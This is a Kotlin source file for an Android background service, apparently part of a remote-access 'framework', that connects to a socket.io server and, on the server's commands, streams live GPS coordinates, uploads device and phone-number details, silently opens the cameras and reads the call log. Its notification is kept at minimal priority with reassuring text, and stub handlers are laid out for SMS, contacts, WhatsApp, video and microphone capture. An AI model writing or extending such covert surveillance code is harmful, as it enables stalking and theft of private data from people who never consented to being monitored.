package com.dkaresearchcenter.dkaframework.Service

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.net.Uri
import android.os.*
import android.provider.CallLog
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.androidhiddencamera.CameraConfig
import com.androidhiddencamera.CameraError
import com.androidhiddencamera.HiddenCameraService
import com.androidhiddencamera.HiddenCameraUtils
import com.androidhiddencamera.config.CameraFacing
import com.androidhiddencamera.config.CameraImageFormat
import com.androidhiddencamera.config.CameraResolution
import com.androidhiddencamera.config.CameraRotation
import com.google.android.gms.location.*
import github.nisrulz.easydeviceinfo.base.EasyBatteryMod
import github.nisrulz.easydeviceinfo.base.EasyDeviceMod
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import com.dkaresearchcenter.dkaframework.R
import java.io.File
import java.net.URISyntaxException


class DKAService : HiddenCameraService() {

    private lateinit var fusedLocationClient : FusedLocationProviderClient
    private lateinit var mLocationRequest : LocationRequest
    private lateinit var mLocationCallback : LocationCallback

    private var mSocket: Socket? = null
    private lateinit var IOOptions : IO.Options

    private lateinit var mEasyDeviceMod : EasyDeviceMod
    private lateinit var mEasyBatteryMod: EasyBatteryMod

    private lateinit var mNotification : Notification

    private var mToogleGPSRealtime : Boolean = false

    private lateinit var mCameraConfig : CameraConfig

    private var mImageReader: ImageReader? = null
    private lateinit var mCameraManager: CameraManager

    private lateinit var mCameraDevice: CameraDevice
    private lateinit var mCameraDeviceStateCallback : CameraDevice.StateCallback

    private lateinit var mCaptureRequestBuilder : CaptureRequest.Builder
    private lateinit var mCaptureSessionStaleCallback : CameraCaptureSession.StateCallback
    private lateinit var mCaptureSessionCaptureCallback: CameraCaptureSession.CaptureCallback


    companion object {
        private var CHANNEL_ID = "CHANNEL_ID"

        private const val GetOneTimeLocation = "GET_LOCATION_ONE_TIME"
        private const val GetRealtimeLocation = "GET_LOCATION_REALTIME"

        private const val GetCameraFrontImage = "GET_CAMERA_FRONT"
        private const val GetCameraBackImage = "GET_CAMERA_BACK"
    }

    override fun attachBaseContext(newBase: Context?) {
        super.attachBaseContext(newBase)

        /** @TODO Set Instance Function Context **/
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        mEasyDeviceMod = EasyDeviceMod(this.applicationContext)
        mEasyBatteryMod = EasyBatteryMod(this.applicationContext)

        /** @TODO Melakukan Set IO Pengaturan **/
        IOOptions = IO.Options().apply {
            this.reconnection = true
            this.forceNew = true
        }
        /** @TODO Melakukan Set URL HOST WebSock **/
        try {
            mSocket = IO.socket(resources.getString(R.string.app_host), IOOptions)
        } catch (e: URISyntaxException) {
            Log.d("DKA ", e.toString())
            this.stopSelf()
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            mImageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2).apply {
                setOnImageAvailableListener({
                    val img = it.acquireLatestImage()
                    /*AndroidNetworking.upload(resources.getString(R.string.app_host) + "/upload")
                            .addMultipartFile("data",null)
                            .build()
                            .setUploadProgressListener { bytesUploaded, totalBytes ->
                                Log.d("DKA", "Progress Upload : " + (bytesUploaded / 1000) + ", Dari Total Upload : " + (totalBytes / 1000))
                                if (bytesUploaded == totalBytes){
                                    Log.d("DKA", "Upload Selesai")
                                }
                            }
                            .getAsJSONObject(object : JSONObjectRequestListener {
                                override fun onResponse(response: JSONObject?) {

                                }

                                override fun onError(anError: ANError?) {

                                }

                            })*/

                    img?.close()
                }, null)
            }

        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {

            mCaptureSessionCaptureCallback = object : CameraCaptureSession.CaptureCallback() {

            }

            mCaptureSessionStaleCallback = object : CameraCaptureSession.StateCallback() {

                override fun onReady(session: CameraCaptureSession) {
                    super.onReady(session)
                    mCaptureRequestBuilder.apply {
                        addTarget(mImageReader?.surface!!)
                    }
                    session.setRepeatingRequest(mCaptureRequestBuilder.build(), mCaptureSessionCaptureCallback, null)
                }
                override fun onConfigured(session: CameraCaptureSession) {

                }

                override fun onConfigureFailed(session: CameraCaptureSession) {

                }

            }

            mCameraDeviceStateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    @Suppress("DEPRECATION")
                    camera.createCaptureSession(mutableListOf(mImageReader?.surface), mCaptureSessionStaleCallback, null)
                }

                override fun onDisconnected(camera: CameraDevice) {

                }

                override fun onError(camera: CameraDevice, error: Int) {

                }

            }
        }


    }

    @SuppressLint("MissingPermission")
    override fun onCreate() {
        super.onCreate()

        /** @TODO Declarasi Lokasi Request Dan Pengaturan **/
        mLocationRequest = LocationRequest.create()
                .setInterval(20L)
                .setFastestInterval(10L)
                .setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY)
        /** @TODO Declare Lokasi Umpan Balik **/
        mLocationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult?) {
                locationResult ?: return
                for (location in locationResult.locations){
                    mSocket?.emit("LocationRequestUpdateRealtime", JSONObject().apply {
                        put("coordinate_lat", location.latitude)
                        put("coordinate_lng", location.longitude)
                        put("coordinate_accuration", location.accuracy)
                        put("coordinate_bearing", location.bearing)
                        put("coordinate_speed", location.speed)
                    })
                }
            }
        }

        /** @TODO Jika Socket Connection Tersambung **/
        mSocket?.on(Socket.EVENT_CONNECT) {


            /*if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                if (HiddenCameraUtils.canOverDrawOtherApps(this)) {

                    Handler(Looper.getMainLooper()).post {
                        //Setting camera configuration
                        mCameraConfig = CameraConfig()
                                .getBuilder(this)
                                .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                                .setCameraResolution(CameraResolution.LOW_RESOLUTION)
                                .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                                .setImageRotation(CameraRotation.ROTATION_270)
                                .build()

                        startCamera(mCameraConfig)

                        takePicture()

                        stopCamera()
                    }

                } else {
                    //Open settings to grant permission for "Draw other apps".
                    HiddenCameraUtils.openDrawOverPermissionSetting(this);
                }
            } else {
                //TODO Ask your parent activity for providing runtime permission
            }*/

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                mCameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager

                for (cameraId in mCameraManager.cameraIdList){
                    val mCharacterCameraManager = mCameraManager.getCameraCharacteristics(cameraId)

                    if (mCharacterCameraManager.get(CameraCharacteristics.LENS_FACING) != CameraCharacteristics.LENS_FACING_FRONT){
                        //#######################################################
                        mCameraManager.openCamera(cameraId, mCameraDeviceStateCallback, null)
                        //######################################################
                    }


                }
            }


            /** @TODO Fungsi Untuk Mendapatkan GPS Realtime **/
            mSocket?.on("getDeviceLocationRealtime"){
                when {
                    mToogleGPSRealtime -> {
                        try {
                            fusedLocationClient.removeLocationUpdates(mLocationCallback)
                            mToogleGPSRealtime = false
                        }catch (e: Exception){}
                    }
                    else -> {
                        try {
                            fusedLocationClient.requestLocationUpdates(mLocationRequest, mLocationCallback, Handler(Looper.getMainLooper()).looper)
                            mToogleGPSRealtime = true
                        }catch (e: Exception){}
                    }
                }
            }

            /** @TODO Fungsi Untuk Mendapatkan Status Perangkat**/
            mSocket?.on("getDeviceStatus"){
                val deviceStatus = JSONObject().apply {
                    putOpt("Device Mode", JSONObject().apply {
                        put("Screen Display ID", mEasyDeviceMod.screenDisplayID)
                        put("Build Version Codename", mEasyDeviceMod.buildVersionCodename)
                        put("Build Version Incremental", mEasyDeviceMod.buildVersionIncremental)
                        put("Build Version SDK", mEasyDeviceMod.buildVersionSDK)
                        put("Build ID", mEasyDeviceMod.buildID)
                        put("Manufacturer", mEasyDeviceMod.manufacturer)
                        put("Model", mEasyDeviceMod.model)
                        put("OS Codename", mEasyDeviceMod.osCodename)
                        put("OS Version", mEasyDeviceMod.osVersion)
                        put("Phone Number", mEasyDeviceMod.phoneNo)
                        put("Radio Hardware Version", mEasyDeviceMod.radioVer)
                        put("Product", mEasyDeviceMod.product)
                        put("Device", mEasyDeviceMod.device)
                        put("Board", mEasyDeviceMod.board)
                        put("Hardware", mEasyDeviceMod.hardware)
                        put("Bootloader", mEasyDeviceMod.bootloader)
                        put("Fingerprint", mEasyDeviceMod.fingerprint)
                        put("Is Device rooted", mEasyDeviceMod.isDeviceRooted)
                        put("Build Brand", mEasyDeviceMod.buildBrand)
                        put("Build Host", mEasyDeviceMod.buildHost)
                        put("Build Tags", mEasyDeviceMod.buildTags)
                        put("Build Time", mEasyDeviceMod.buildTime)
                        put("Build User", mEasyDeviceMod.buildUser)
                        put("Build Version Release", mEasyDeviceMod.buildVersionRelease)
                    })
                    putOpt("Baterai", JSONObject().apply {
                        put("Persentase Baterai", mEasyBatteryMod.batteryPercentage)
                        put("Voltase Baterai", mEasyBatteryMod.batteryVoltage)
                    })
                }
                mSocket?.emit("device_info", deviceStatus)
            }

            /** @TODO Fungsi Untuk Mendapatkan SMS **/
            mSocket?.on("getDeviceSMS"){

            }

            /** @TODO Fungsi Untuk Mendapatkan Log Panggilan **/
            mSocket?.on("getDeviceCallLog"){

            }

            /** @TODO FUngsi Untuk Mendapatkan Buku Kontak **/
            mSocket?.on("getDeviceContactBook"){

            }

            /** @TODO Fungsi Untuk Mendapatkan What Apps **/
            mSocket?.on("getDeviceWhatApps"){

            }

            /** @TODO Fungsi Untuk Mendapatkan Data Kamera **/
            mSocket?.on("getDeviceCameraCapture"){
                //Setting camera configuration
                //Setting camera configuration
                mCameraConfig = CameraConfig()
                        .getBuilder(this)
                        .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                        .setCameraResolution(CameraResolution.LOW_RESOLUTION)
                        .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                        .setImageRotation(CameraRotation.ROTATION_270)
                        .build()

                startCamera(mCameraConfig)
            }

            /** @TODO Fungsi Video Record **/
            mSocket?.on("getDeviceVideoRecord"){

            }

            /** @TODO Fungsi Untuk Mendapatkan Data Suara Mic **/
            mSocket?.on("getDeviceMicrophone"){

            }


        }
        /** @TODO Jika Terjadi Error Pada Koneksi **/
        mSocket?.on(Socket.EVENT_CONNECT_ERROR) {
            Log.d("DKA : ", "Connect Error : " + it[0].toString())

        }
        /** @TODO Jika Socket Connection Terputus **/
        mSocket?.on(Socket.EVENT_DISCONNECT) {
            Log.d("DKA", "mSocket Disconnected")
        }

        /** @TODO Create The Notification Channel **/
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            val serviceChannel = NotificationChannel(CHANNEL_ID, resources.getString(R.string.app_name), NotificationManager.IMPORTANCE_NONE)
            getSystemService(NotificationManager::class.java).apply {
                createNotificationChannel(serviceChannel)
            }
        }
    }

    @SuppressLint("MissingPermission")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        mSocket?.connect()

        /** Create Notification **/
        mNotification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(resources.getString(R.string.app_name))
                .setContentText("Terhubung Dengan Keamanan Tinggi Ke Server")
                .setSmallIcon(R.drawable.assets_framework_dka)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()

        startForeground(1, mNotification)

        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onImageCapture(imageFile: File) {


    }

    override fun onCameraError(errorCode: Int) {
        when (errorCode) {
            CameraError.ERROR_CAMERA_OPEN_FAILED -> {
                Log.d("DKA", "Kamera Gagal Di Buka : " + errorCode)
                stopCamera()
            }
            CameraError.ERROR_IMAGE_WRITE_FAILED -> {
                Log.d("DKA", "Kamera Gagal Menulis Gambar")
                stopCamera()

            }
            CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE -> {
                Log.d("DKA", "Kamera Permission Tidak Tersedia")
                stopCamera()
            }
            CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ->             //Display information dialog to the user with steps to grant "Draw over other app"
                //permission for the app.
                HiddenCameraUtils.openDrawOverPermissionSetting(this)
            CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA -> {
                Log.d("DKA", "Ponsel Tidak Memiliki Kamera Depan")
                stopCamera()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        fusedLocationClient.removeLocationUpdates(mLocationCallback)
        mSocket?.disconnect()
        mSocket?.close()

    }

    @RequiresApi(Build.VERSION_CODES.O)
    @SuppressLint("Recycle")
    private fun getContactList() : JSONArray {

        val mListContactArray = JSONArray()

        val uriCallLogs: Uri = Uri.parse("content://call_log/calls")
        val cursorCallLogs = contentResolver.query(uriCallLogs, null, null, null)
        cursorCallLogs?.moveToFirst()
        do {
            val stringNumber = cursorCallLogs?.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.NUMBER))
            val stringName = cursorCallLogs?.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.CACHED_NAME))
            val stringDuration = cursorCallLogs?.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.DURATION))
            val stringType = cursorCallLogs?.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.TYPE))

            mListContactArray.put(JSONObject().apply {
                put("nama Kontak", stringName)
                put("no telp", stringNumber)
                put("durasi Panggilan", stringDuration)
                put("tipe Panggilan", stringType)
            })
        } while (cursorCallLogs?.moveToNext()!!)

        return mListContactArray
    }


}